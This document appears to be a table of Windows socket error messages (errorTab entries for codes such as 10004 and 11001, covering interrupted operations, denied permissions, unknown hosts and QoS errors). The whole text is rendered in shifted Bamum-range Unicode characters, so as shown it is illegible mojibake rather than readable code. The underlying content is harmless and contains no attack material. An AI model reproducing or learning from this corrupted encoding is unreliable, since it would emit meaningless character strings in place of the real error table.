꛸꛻꛷꛰꛿꛰ꚫ꛷ꛬ꛿꛰꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚻꚿꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꜂ꛬ꛾ꚫ꛴꛹꛿꛰꛽꛽꜀꛻꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚻꛄꛨꚫꛈꚫꚭꛌꚫꛭꛬꛯꚫ꛱꛴꛷꛰ꚫ꛳ꛬ꛹ꛯ꛷꛰ꚫ꜂ꛬ꛾ꚫ꛻ꛬ꛾꛾꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚼꚾꛨꚫꛈꚫꚭꛛ꛰꛽꛸꛴꛾꛾꛴꛺꛹ꚫꛯ꛰꛹꛴꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚼꚿꛨꚫꛈꚫꚭꛌꚫ꛱ꛬ꜀꛷꛿ꚫ꛺ꛮꛮ꜀꛽꛽꛰ꛯꚫ꛺꛹ꚫ꛿꛳꛰ꚫ꛹꛰꛿꜂꛺꛽꛶ꛊꛊꚭꚫꚫꚮꚫꛢꛞꛌꛐꛑꛌꛠꛗꛟꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚽꚽꛨꚫꛈꚫꚭꛌ꛹ꚫ꛴꛹꜁ꛬ꛷꛴ꛯꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꜂ꛬ꛾ꚫꛬ꛿꛿꛰꛸꛻꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚽꚿꛨꚫꛈꚫꚭꛟ꛺꛺ꚫ꛸ꛬ꛹꜄ꚫ꛺꛻꛰꛹ꚫ꛱꛴꛷꛰꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚾꛀꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꜂꛺꜀꛷ꛯꚫꛭ꛷꛺ꛮ꛶ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚾꛁꛨꚫꛈꚫꚭꛌꚫꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛴꛾ꚫꛬ꛷꛽꛰ꛬꛯ꜄ꚫ꛴꛹ꚫ꛻꛽꛺꛲꛽꛰꛾꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚾꛂꛨꚫꛈꚫꚭꛚ꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫꛬ꛷꛽꛰ꛬꛯ꜄ꚫ꛴꛹ꚫ꛻꛽꛺꛲꛽꛰꛾꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚾꛃꛨꚫꛈꚫꚭꛞ꛺ꛮ꛶꛰꛿ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛺꛹ꚫ꛹꛺꛹꛾꛺ꛮ꛶꛰꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚾꛄꛨꚫꛈꚫꚭꛏ꛰꛾꛿꛴꛹ꛬ꛿꛴꛺꛹ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛽꛰꛼꜀꛴꛽꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꚻꛨꚫꛈꚫꚭꛘ꛰꛾꛾ꛬ꛲꛰ꚫ꛿꛺꛺ꚫ꛷꛺꛹꛲ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꚼꛨꚫꛈꚫꚭꛛ꛽꛺꛿꛺ꛮ꛺꛷ꚫ꜂꛽꛺꛹꛲ꚫ꛿꜄꛻꛰ꚫ꛱꛺꛽ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꚽꛨꚫꛈꚫꚭꛍꛬꛯꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛺꛻꛿꛴꛺꛹ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꚾꛨꚫꛈꚫꚭꛛ꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꚿꛨꚫꛈꚫꚭꛞ꛺ꛮ꛶꛰꛿ꚫ꛿꜄꛻꛰ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꛀꛨꚫꛈꚫꚭꛚ꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꛁꛨꚫꛈꚫꚭꛛ꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꛂꛨꚫꛈꚫꚭꛌꛯꛯ꛽꛰꛾꛾ꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫꛭ꜄ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛱ꛬ꛸꛴꛷꜄ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꛃꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛹꛰꛿꜂꛺꛽꛶ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛴꛾ꚫ꛴꛹ꚫ꜀꛾꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꚿꛄꛨꚫꛈꚫꚭꛎꛬ꛹꛹꛺꛿ꚫꛬ꛾꛾꛴꛲꛹ꚫ꛽꛰꛼꜀꛰꛾꛿꛰ꛯꚫꛬꛯꛯ꛽꛰꛾꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꚻꛨꚫꛈꚫꚭꛙ꛰꛿꜂꛺꛽꛶ꚫ꛴꛾ꚫꛯ꛺꜂꛹ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꚼꛨꚫꛈꚫꚭꛙ꛰꛿꜂꛺꛽꛶ꚫ꛴꛾ꚫ꜀꛹꛽꛰ꛬꛮ꛳ꛬꛭ꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꚽꛨꚫꛈꚫꚭꛙ꛰꛿꜂꛺꛽꛶ꚫꛯ꛽꛺꛻꛻꛰ꛯꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛺꛹ꚫ꛽꛰꛾꛰꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꚾꛨꚫꛈꚫꚭꛞ꛺꛱꛿꜂ꛬ꛽꛰ꚫꛮꛬ꜀꛾꛰ꛯꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫꛬꛭ꛺꛽꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꚿꛨꚫꛈꚫꚭꛟ꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛳ꛬ꛾ꚫꛭ꛰꛰꛹ꚫ꛽꛰꛾꛰꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꛀꛨꚫꛈꚫꚭꛙ꛺ꚫꛭ꜀꛱꛱꛰꛽ꚫ꛾꛻ꛬꛮ꛰ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꛁꛨꚫꛈꚫꚭꛞ꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫꛬ꛷꛽꛰ꛬꛯ꜄ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꛂꛨꚫꛈꚫꚭꛞ꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꛃꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛹꛰꛿꜂꛺꛽꛶ꚫ꛳ꛬ꛾ꚫꛭ꛰꛰꛹ꚫ꛾꛳꜀꛿ꚫꛯ꛺꜂꛹ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛀꛄꛨꚫꛈꚫꚭꛟ꛺꛺ꚫ꛸ꛬ꛹꜄ꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꚻꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛿꛴꛸꛰ꛯꚫ꛺꜀꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꚼꛨꚫꛈꚫꚭꛎ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛽꛰꛱꜀꛾꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꚽꛨꚫꛈꚫꚭꛎꛬ꛹꛹꛺꛿ꚫ꛿꛽ꛬ꛹꛾꛷ꛬ꛿꛰ꚫ꛹ꛬ꛸꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꚾꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛹ꛬ꛸꛰ꚫ꛴꛾ꚫ꛿꛺꛺ꚫ꛷꛺꛹꛲ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꚿꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛳꛺꛾꛿ꚫ꛴꛾ꚫꛯ꛺꜂꛹ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꛀꛨꚫꛈꚫꚭꛟ꛳꛰ꚫ꛳꛺꛾꛿ꚫ꛴꛾ꚫ꜀꛹꛽꛰ꛬꛮ꛳ꛬꛭ꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꛁꛨꚫꛈꚫꚭꛏ꛴꛽꛰ꛮ꛿꛺꛽꜄ꚫ꛹꛺꛿ꚫ꛰꛸꛻꛿꜄ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꛂꛨꚫꛈꚫꚭꛟ꛺꛺ꚫ꛸ꛬ꛹꜄ꚫ꛻꛽꛺ꛮ꛰꛾꛾꛰꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꛃꛨꚫꛈꚫꚭꛠ꛾꛰꛽ꚫ꛼꜀꛺꛿ꛬꚫ꛰꜃ꛮ꛰꛰ꛯ꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛁꛄꛨꚫꛈꚫꚭꛏ꛴꛾꛶ꚫ꛼꜀꛺꛿ꛬꚫ꛰꜃ꛮ꛰꛰ꛯ꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛂꚻꛨꚫꛈꚫꚭꛞ꛿ꛬ꛷꛰ꚫ꛱꛴꛷꛰ꚫ꛳ꛬ꛹ꛯ꛷꛰ꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛂꚼꛨꚫꛈꚫꚭꛔ꛿꛰꛸ꚫ꛴꛾ꚫ꛽꛰꛸꛺꛿꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛄꚼꛨꚫꛈꚫꚭꛙ꛰꛿꜂꛺꛽꛶ꚫ꛾꜀ꛭ꛾꜄꛾꛿꛰꛸ꚫ꛴꛾ꚫ꜀꛹ꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛄꚽꛨꚫꛈꚫꚭꛢ꛴꛹꛾꛺ꛮ꛶ꚹꛯ꛷꛷ꚫ꜁꛰꛽꛾꛴꛺꛹ꚫ꛺꜀꛿ꚫ꛺꛱ꚫ꛽ꛬ꛹꛲꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚻꛄꚾꛨꚫꛈꚫꚭꛞ꜀ꛮꛮ꛰꛾꛾꛱꜀꛷ꚫꛢꛞꛌꛞ꛿ꛬ꛽꛿꜀꛻ꚫ꛹꛺꛿ꚫ꜄꛰꛿ꚫ꛻꛰꛽꛱꛺꛽꛸꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꚼꛨꚫꛈꚫꚭꛒ꛽ꛬꛮ꛰꛱꜀꛷ꚫ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚫ꛴꛹ꚫ꛻꛽꛺꛲꛽꛰꛾꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꚽꛨꚫꛈꚫꚭꛙ꛺ꚫ꛸꛺꛽꛰ꚫ꛽꛰꛾꜀꛷꛿꛾ꚫ꛱꛽꛺꛸ꚫꛢꛞꛌꛗ꛺꛺꛶꜀꛻ꛞ꛰꛽꜁꛴ꛮ꛰ꛙ꛰꜃꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꚾꛨꚫꛈꚫꚭꛎꛬ꛷꛷ꚫ꛳ꛬ꛾ꚫꛭ꛰꛰꛹ꚫꛮꛬ꛹ꛮ꛰꛷꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꚿꛨꚫꛈꚫꚭꛛ꛽꛺ꛮ꛰ꛯ꜀꛽꛰ꚫꛮꛬ꛷꛷ꚫ꛿ꛬꛭ꛷꛰ꚫ꛴꛾ꚫ꛴꛹꜁ꛬ꛷꛴ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꛀꛨꚫꛈꚫꚭꛞ꛰꛽꜁꛴ꛮ꛰ꚫ꛻꛽꛺꜁꛴ꛯ꛰꛽ꚫ꛴꛾ꚫ꛴꛹꜁ꛬ꛷꛴ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꛁꛨꚫꛈꚫꚭꛞ꛰꛽꜁꛴ꛮ꛰ꚫ꛻꛽꛺꜁꛴ꛯ꛰꛽ꚫ꛱ꛬ꛴꛷꛰ꛯꚫ꛿꛺ꚫ꛴꛹꛴꛿꛴ꛬ꛷꛴꜅꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꛂꛨꚫꛈꚫꚭꛞ꜄꛾꛿꛰꛸ꚫꛮꛬ꛷꛷ꚫ꛱ꛬ꛴꛷꜀꛽꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꛃꛨꚫꛈꚫꚭꛞ꛰꛽꜁꛴ꛮ꛰ꚫ꛹꛺꛿ꚫ꛱꛺꜀꛹ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚻꛄꛨꚫꛈꚫꚭꛎ꛷ꛬ꛾꛾ꚫ꛿꜄꛻꛰ꚫ꛹꛺꛿ꚫ꛱꛺꜀꛹ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚼꚻꛨꚫꛈꚫꚭꛙ꛺ꚫ꛸꛺꛽꛰ꚫ꛽꛰꛾꜀꛷꛿꛾ꚫ꛱꛽꛺꛸ꚫꛢꛞꛌꛗ꛺꛺꛶꜀꛻ꛞ꛰꛽꜁꛴ꛮ꛰ꛙ꛰꜃꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚼꚼꛨꚫꛈꚫꚭꛎꛬ꛷꛷ꚫ꜂ꛬ꛾ꚫꛮꛬ꛹ꛮ꛰꛷꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚻꚼꚼꚽꛨꚫꛈꚫꚭꛏꛬ꛿ꛬꛭꛬ꛾꛰ꚫ꛼꜀꛰꛽꜄ꚫ꜂ꛬ꛾ꚫ꛽꛰꛱꜀꛾꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꚼꛨꚫꛈꚫꚭꛓ꛺꛾꛿ꚫ꛹꛺꛿ꚫ꛱꛺꜀꛹ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꚽꛨꚫꛈꚫꚭꛙ꛺꛹ꛬ꜀꛿꛳꛺꛽꛴꛿ꛬ꛿꛴꜁꛰ꚫ꛳꛺꛾꛿ꚫ꛹꛺꛿ꚫ꛱꛺꜀꛹ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꚾꛨꚫꛈꚫꚭꛟ꛳꛴꛾ꚫ꛴꛾ꚫꛬꚫ꛹꛺꛹꛽꛰ꛮ꛺꜁꛰꛽ꛬꛭ꛷꛰ꚫ꛰꛽꛽꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꚿꛨꚫꛈꚫꚭꛡꛬ꛷꛴ꛯꚫ꛹ꛬ꛸꛰ꚷꚫ꛹꛺ꚫꛯꛬ꛿ꛬꚫ꛽꛰ꛮ꛺꛽ꛯꚫ꛽꛰꛼꜀꛰꛾꛿꛰ꛯꚫ꛿꜄꛻꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꛀꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛽꛰ꛮ꛰꛴꜁꛰꛽꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꛁꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛾꛰꛹ꛯ꛰꛽꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꛂꛨꚫꛈꚫꚭꛙ꛺ꚫꛜ꛺ꛞꚫ꛾꛰꛹ꛯ꛰꛽꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꛃꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛹꛺ꚫ꛽꛰ꛮ꛰꛴꜁꛰꛽꛾ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚻꛄꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛽꛰꛼꜀꛰꛾꛿ꚫꛮ꛺꛹꛱꛴꛽꛸꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꚻꛨꚫꛈꚫꚭꛜ꛺ꛞꚫꛬꛯ꛸꛴꛾꛾꛴꛺꛹ꚫ꛰꛽꛽꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꚼꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛻꛺꛷꛴ꛮ꜄ꚫ꛱ꛬ꛴꛷꜀꛽꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꚽꛨꚫꛈꚫꚭꛜ꛺ꛞꚫꛭꛬꛯꚫ꛾꛿꜄꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꚾꛨꚫꛈꚫꚭꛜ꛺ꛞꚫꛭꛬꛯꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꚿꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛿꛽ꛬ꛱꛱꛴ꛮꚫꛮ꛺꛹꛿꛽꛺꛷ꚫ꛰꛽꛽꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꛀꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛲꛰꛹꛰꛽꛴ꛮꚫ꛰꛽꛽꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꛁꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛾꛰꛽꜁꛴ꛮ꛰ꚫ꛿꜄꛻꛰ꚫ꛰꛽꛽꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꛂꛨꚫꛈꚫꚭꛜ꛺ꛞꚫ꛱꛷꛺꜂꛾꛻꛰ꛮꚫ꛰꛽꛽꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꛃꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛻꛽꛺꜁꛴ꛯ꛰꛽ꚫꛭ꜀꛱꛱꛰꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚼꛄꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛱꛴꛷꛿꛰꛽ꚫ꛾꛿꜄꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꚻꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛱꛴꛷꛿꛰꛽ꚫ꛾꛿꜄꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꚼꛨꚫꛈꚫꚭꛔ꛹ꛮ꛺꛽꛽꛰ꛮ꛿ꚫꛜ꛺ꛞꚫ꛱꛴꛷꛿꛰꛽ꚫꛮ꛺꜀꛹꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꚽꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛷꛰꛹꛲꛿꛳ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꚾꛨꚫꛈꚫꚭꛔ꛹ꛮ꛺꛽꛽꛰ꛮ꛿ꚫꛜ꛺ꛞꚫ꛱꛷꛺꜂ꚫꛮ꛺꜀꛹꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꚿꛨꚫꛈꚫꚭꛠ꛹꛽꛰ꛮ꛺꛲꛹꛴꜅꛰ꛯꚫꛜ꛺ꛞꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꛀꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛻꛺꛷꛴ꛮ꜄ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꛁꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛱꛷꛺꜂ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꛂꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛻꛽꛺꜁꛴ꛯ꛰꛽ꚸ꛾꛻꛰ꛮ꛴꛱꛴ꛮꚫ꛱꛷꛺꜂꛾꛻꛰ꛮꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꛃꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛻꛽꛺꜁꛴ꛯ꛰꛽ꚸ꛾꛻꛰ꛮ꛴꛱꛴ꛮꚫ꛱꛴꛷꛿꛰꛽꛾꛻꛰ꛮꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚽꛄꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛾꛳ꛬ꛻꛰ꚫꛯ꛴꛾ꛮꛬ꛽ꛯꚫ꛸꛺ꛯ꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚾꚻꛨꚫꛈꚫꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛜ꛺ꛞꚫ꛾꛳ꛬ꛻꛴꛹꛲ꚫ꛽ꛬ꛿꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꚼꚼꚻꚾꚼꛨꚫꛈꚫꚭꛝ꛰꛾꛰꛽꜁꛰ꛯꚫ꛻꛺꛷꛴ꛮ꜄ꚫꛜ꛺ꛞꚫ꛰꛷꛰꛸꛰꛹꛿ꚫ꛿꜄꛻꛰ꚹꚭꚕ